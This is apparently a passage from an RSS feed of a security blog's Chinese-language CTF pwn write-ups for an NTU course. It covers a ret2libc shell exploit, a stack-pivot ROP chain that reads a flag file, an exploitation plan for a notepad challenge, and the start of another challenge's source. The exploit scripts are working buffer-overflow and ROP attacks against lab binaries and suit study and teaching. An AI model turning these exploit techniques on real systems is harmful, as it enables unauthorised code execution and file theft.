&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r&lt;span style="color:#f92672">.&lt;/span>sendlineafter(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Try your best :&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;a&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">0x28&lt;/span> &lt;span style="color:#f92672">+&lt;/span> payload)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(r&lt;span style="color:#f92672">.&lt;/span>recvline())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>puts_addr &lt;span style="color:#f92672">=&lt;/span> u64(r&lt;span style="color:#f92672">.&lt;/span>recv(&lt;span style="color:#ae81ff">6&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>ljust(&lt;span style="color:#ae81ff">8&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;puts address = &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>hex(puts_addr)&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc_base &lt;span style="color:#f92672">=&lt;/span> puts_addr &lt;span style="color:#f92672">-&lt;/span> libc&lt;span style="color:#f92672">.&lt;/span>symbols[&lt;span style="color:#e6db74">&amp;#39;puts&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc&lt;span style="color:#f92672">.&lt;/span>address &lt;span style="color:#f92672">=&lt;/span> libc_base
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>system_addr &lt;span style="color:#f92672">=&lt;/span> libc&lt;span style="color:#f92672">.&lt;/span>symbols[&lt;span style="color:#e6db74">&amp;#39;system&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;system address = &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>hex(system_addr)&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r&lt;span style="color:#f92672">.&lt;/span>sendline(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;/bin/sh&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>raw_input()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r&lt;span style="color:#f92672">.&lt;/span>sendline(p64(libc&lt;span style="color:#f92672">.&lt;/span>symbols[&lt;span style="color:#e6db74">&amp;#39;system&amp;#39;&lt;/span>]))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Simple PWN 0x35(2023 Lab - Stack Pivot)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x352023-lab---stack-pivot/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x352023-lab---stack-pivot/</guid><description>&lt;h1 id="simple-pwn-0x352023-lab---stack-pivot">
 Simple PWN 0x35(2023 Lab - Stack Pivot)
 &lt;a class="anchor" href="#simple-pwn-0x352023-lab---stack-pivot">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://hackmd.io/@SBK6401/rylybxgji">Simple PWN - 0x09(stack pivoting)&lt;/a>
&lt;a href="https://hackmd.io/@SBK6401/H1NX6Bloj">Simple PWN - 0x10(seccomp/Lab - rop2win)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> buf[&lt;span style="color:#ae81ff">0x20&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(&lt;span style="color:#ae81ff">0&lt;/span>, buf, &lt;span style="color:#ae81ff">0x80&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題助教是預設我們必須要使用stack pivot的技巧拿到flag，不過沒有時間設定seccomp，所以我們自己假裝只能使用read / write / open這三個syscall&lt;/p>
&lt;ol>
&lt;li>checksec + file
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ checksec chal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_stack_pivot/share/chal&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Arch: amd64-64-little
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> RELRO: Partial RELRO
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Stack: Canary found
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> NX: NX enabled
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PIE: No PIE &lt;span style="color:#f92672">(&lt;/span>0x400000&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ file chal
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>chal: ELF 64-bit LSB executable, x86-64, version &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">(&lt;/span>GNU/Linux&lt;span style="color:#f92672">)&lt;/span>, statically linked, BuildID&lt;span style="color:#f92672">[&lt;/span>sha1&lt;span style="color:#f92672">]=&lt;/span>26fa8e6daa97baf7a26596ea91af5703dd932327, &lt;span style="color:#66d9ef">for&lt;/span> GNU/Linux 3.2.0, not stripped
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>首先可以看到該binary是statically link，所以直覺是利用ROP chain拿到shell，不過仔細看source code會發現BOF的長度顯然不太夠我們蓋成shell，所以需要用到stack pivot的技巧，控制RBP跳到其他的地方繼續寫&lt;/li>
&lt;li>找gadget
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>leave_ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0000000000401cfc&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rdi_ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0000000000401832&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rsi_ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x000000000040f01e&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rax_ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0000000000448d27&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pop_rdx_ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x000000000040173f&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>syscall_ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x0000000000448280&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>這邊的重點是syscall ret這個gadget，其實他不是syscall完之後直接ret，而是在經過一些判斷才會進到ret，這個可以從gdb看出來
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gef➤ x/10i 0x448280
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x448280 &amp;lt;read+16&amp;gt;: syscall
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">=&lt;/span>&amp;gt; 0x448282 &amp;lt;read+18&amp;gt;: cmp rax,0xfffffffffffff000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x448288 &amp;lt;read+24&amp;gt;: ja 0x4482e0 &amp;lt;read+112&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x44828a &amp;lt;read+26&amp;gt;: ret
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>會這樣的原因是我們在ROPgadget中找不到&lt;code>syscall ; ret&lt;/code>的gadget，所以助教提示可以直接從read / write這種function找，這樣syscall完了之後會很快的接到ret，這樣中間的操作才不會太影響我們蓋的rop&lt;/li>
&lt;li>Construct ROP
首先，我們的流程是
==main_fn → bss_open → main_fn → bss_open → main_fn → bss_write==
會這樣的原因是我們只能寫入0x60的空間而已，所以把open / read / write分開寫，而寫完且執行完後會再跳原main_fn，這樣才能讓我們再讀取下一段的ROP payload
&lt;ol>
&lt;li>寫入的bss_addr和main_fn address
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>bss_addr_open &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x4c2700&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bss_addr_read &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x4c2800&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bss_addr_write &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x4c2900&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>main_fn &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x401ce1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>先讓rbp跳到bss_open，然後ret到main_fn，接要放到bss_open的payload
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>trash_payload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;a&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">0x20&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r&lt;span style="color:#f92672">.&lt;/span>sendline(trash_payload &lt;span style="color:#f92672">+&lt;/span> p64(bss_addr_open) &lt;span style="color:#f92672">+&lt;/span> p64(main_fn))
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>之前的rop chain我們會把RBP一起蓋掉，但現在因為要跳到其他的地方，所以rbp的部分就跳到&lt;code>0x4c2700&lt;/code>，然後ret address接main_fn
用gdb跟一下，放完的結果大概是這樣
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>0x00007ffc884f3670│+0x0000: &lt;span style="color:#e6db74">&amp;#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;#34;&lt;/span> ← $rsp, $rsi
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x00007ffc884f3678│+0x0008: &lt;span style="color:#e6db74">&amp;#34;aaaaaaaaaaaaaaaaaaaaaaaa&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x00007ffc884f3680│+0x0010: &lt;span style="color:#e6db74">&amp;#34;aaaaaaaaaaaaaaaa&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x00007ffc884f3688│+0x0018: &lt;span style="color:#e6db74">&amp;#34;aaaaaaaa&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x00007ffc884f3690│+0x0020: 0x00000000004c2700 → &amp;lt;transmem_list+0&amp;gt; add BYTE PTR &lt;span style="color:#f92672">[&lt;/span>rax&lt;span style="color:#f92672">]&lt;/span>, al ← $rbp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x00007ffc884f3698│+0x0028: 0x0000000000401ce1 → &amp;lt;main+12&amp;gt; lea rax, &lt;span style="color:#f92672">[&lt;/span>rbp-0x20&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>當main_fn執行完leave(&lt;code>mov rsp , rbp ; pop rbp ;&lt;/code>)的時候，rbp就會指到==0x4c2700==，當我們ret到main_fn時，就可以再次輸入payload放到0x4c2700&lt;/li>
&lt;li>觀察main_fn的assembly
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gef➤ x/10i &amp;amp;main
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401cd5 &amp;lt;main&amp;gt;: endbr64
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401cd9 &amp;lt;main+4&amp;gt;: push rbp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401cda &amp;lt;main+5&amp;gt;: mov rbp,rsp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401cdd &amp;lt;main+8&amp;gt;: sub rsp,0x20
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401ce1 &amp;lt;main+12&amp;gt;: lea rax,&lt;span style="color:#f92672">[&lt;/span>rbp-0x20&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401ce5 &amp;lt;main+16&amp;gt;: mov edx,0x80
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401cea &amp;lt;main+21&amp;gt;: mov rsi,rax
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401ced &amp;lt;main+24&amp;gt;: mov edi,0x0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401cf2 &amp;lt;main+29&amp;gt;: call 0x448270 &amp;lt;read&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x401cf7 &amp;lt;main+34&amp;gt;: mov eax,0x0
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>從以上的code可以看得出來，我們是跳到0x401ce1，所以rbp會張出0x20的空間，也就是==0x4c2700-0x20=0x4c26e0==，然後read到的內容就會放到這邊來&lt;/li>
&lt;li>寫入bss_addr_open
我們的目標是達成==fd = open(&amp;quot;/home/chal/flag.txt&amp;quot;, 0);==，具體payload如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>file_addr &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;/home/chal/flag.txt&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>ljust(&lt;span style="color:#ae81ff">0x20&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ROP_open &lt;span style="color:#f92672">=&lt;/span> flat(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Open file&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># fd = open(&amp;#34;/home/chal/flag.txt&amp;#34;, 0);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> bss_addr_read,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rax_ret, &lt;span style="color:#ae81ff">2&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdi_ret, bss_addr_open &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rsi_ret, &lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdx_ret, &lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> syscall_ret,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> main_fn
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r&lt;span style="color:#f92672">.&lt;/span>sendline(file_addr &lt;span style="color:#f92672">+&lt;/span> ROP_open)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>首先原本的0x20就拿來放檔案的位址，不過為甚麼後面還要再接著bss_addr_write呢?就和上面一樣，我們要寫別的rop payload上去，因為原本的位子不夠寫了，所以syscall_ret後接到main_fn，他會讀取我們寫入的rop payload到bss_addr_read的地方&lt;/li>
&lt;li>寫入bss_addr_read
我們要達成的目標是==read(fd, buf, 0x30)==，具體payload如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>ROP_read &lt;span style="color:#f92672">=&lt;/span> flat(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Read the file&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># read(fd, buf, 0x30);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> bss_addr_write,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rax_ret, &lt;span style="color:#ae81ff">0&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdi_ret, &lt;span style="color:#ae81ff">3&lt;/span>, 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rsi_ret, bss_addr_read,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdx_ret, &lt;span style="color:#ae81ff">0x30&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> syscall_ret,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> main_fn
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r&lt;span style="color:#f92672">.&lt;/span>sendline(file_addr &lt;span style="color:#f92672">+&lt;/span> ROP_read)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>寫入bss_addr_write
我們要達成的目標是==write(fd, buf, 0x30)==，具體payload如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>ROP_write &lt;span style="color:#f92672">=&lt;/span> flat(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Write the file&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># write(1, buf, 0x30);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> bss_addr_write,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rax_ret, &lt;span style="color:#ae81ff">1&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdi_ret, &lt;span style="color:#ae81ff">1&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rsi_ret, bss_addr_read,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pop_rdx_ret, &lt;span style="color:#ae81ff">0x30&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> syscall_ret,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>r&lt;span style="color:#f92672">.&lt;/span>sendline(file_addr &lt;span style="color:#f92672">+&lt;/span> ROP_write)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ol>
&lt;p>:::danger
執行的時候如果遇到local端可以run但server爛掉的情況，有可能是raw_input()造成的，可以先註解掉這些東西，如果還是遇到一樣的問題，可以開docker在裡面執行&lt;/p></description></item><item><title>Simple PWN 0x36(2023 HW - Notepad-Stage 3)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x362023-hw---notepad-stage-3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x362023-hw---notepad-stage-3/</guid><description>&lt;h1 id="simple-pwn-0x362023-hw---notepad-stage-3">
 Simple PWN 0x36(2023 HW - Notepad-Stage 3)
 &lt;a class="anchor" href="#simple-pwn-0x362023-hw---notepad-stage-3">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>呈上上題&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題沒時間解出來，所以僅僅做個紀錄，包含和各位大老討論的結果以及流程&lt;/p>
&lt;ol>
&lt;li>首先，後端有一個洞，就是在login的write，他的buf仔細和其他有call到write做對比會發現，他並沒有清掉buf的內容，這代表他會完完整整的把裡面的內容送到前端，但為甚麼前面兩題都沒有這個問題呢?因為前端並沒有把buf的內容印出來，所以首要目標是找到一個方法可以leak出內容的shellcode之類的，這樣我們就可以抓到text / libc base address&lt;/li>
&lt;li>知道這些事情可以幹嘛呢?check token有一個bof的洞，我們可以利用這個洞來傳送rop，所以需要ret2libc抓到base address之後在蓋rop&lt;/li>
&lt;li>ROP具體的內容是甚麼呢?有兩種方法可以拿到flag，一個是拿到shell之後setuid(0)，因為backend 有 suid 權限，所以我們才可以用 setuid(0) 以root 執行，然後cat /flag_root；第二種是直接ORW，看flag是啥這樣&lt;/li>
&lt;/ol></description></item><item><title>Simple PWN 0x37(2023 HW - HACHAMA)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x372023-hw---hachama/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x372023-hw---hachama/</guid><description>&lt;h1 id="simple-pwn-0x372023-hw---hachama">
 Simple PWN 0x37(2023 HW - HACHAMA)
 &lt;a class="anchor" href="#simple-pwn-0x372023-hw---hachama">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>stack pivot
rop
bof&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;#34;SECCOMP.h&amp;#34;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">long&lt;/span> n;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">char&lt;/span> msg[&lt;span style="color:#ae81ff">0x20&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">long&lt;/span> n2;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">sock_filter&lt;/span> seccompfilter[]&lt;span style="color:#f92672">=&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	BPF_STMT(BPF_LD &lt;span style="color:#f92672">|&lt;/span> BPF_W &lt;span style="color:#f92672">|&lt;/span> BPF_ABS, ArchField),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	BPF_JUMP(BPF_JMP &lt;span style="color:#f92672">|&lt;/span> BPF_JEQ &lt;span style="color:#f92672">|&lt;/span> BPF_K, AUDIT_ARCH_X86_64, &lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	BPF_STMT(BPF_RET &lt;span style="color:#f92672">|&lt;/span> BPF_K, SECCOMP_RET_KILL),
